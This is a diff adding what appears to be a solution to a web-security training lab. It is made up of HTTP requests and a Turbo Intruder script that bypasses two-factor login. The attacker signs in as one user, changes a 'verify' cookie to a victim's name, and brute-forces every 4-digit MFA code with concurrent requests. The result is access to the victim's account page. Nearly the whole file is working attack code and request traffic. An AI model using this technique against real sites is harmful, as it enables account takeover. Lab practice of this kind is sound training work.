@@ -1,0 +1,38 @@
+POST /login HTTP/1.1
+Cookie: session=KotGuwroI053ZfobxpikoBnfRvIzWRiX; verify=wiener
+
+username=wiener&password=peter
+
+GET /login2 HTTP/1.1
+Cookie: session=6r5eFPunWQxaWwtR0j15pDBhFsPkDHdO; verify=carlos
+
+POST /login2 HTTP/1.1
+Cookie: session=6r5eFPunWQxaWwtR0j15pDBhFsPkDHdO; verify=carlos
+
+mfa-code=%s
+
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=20,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+
+    for i in xrange(10000):
+      engine.queue(target.req, "{0:0>4}".format(i))
+
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if "Incorrect security code" not in req.response:
+      table.add(req)
+
+
+POST /login2 HTTP/1.1
+Cookie: session=6r5eFPunWQxaWwtR0j15pDBhFsPkDHdO; verify=carlos
+
+mfa-code=1561
+
+GET /my-account HTTP/1.1
+Cookie: session=o7ScrVFjbfehYCXCdh8RX5gee4WjbTMc; verify=carlos
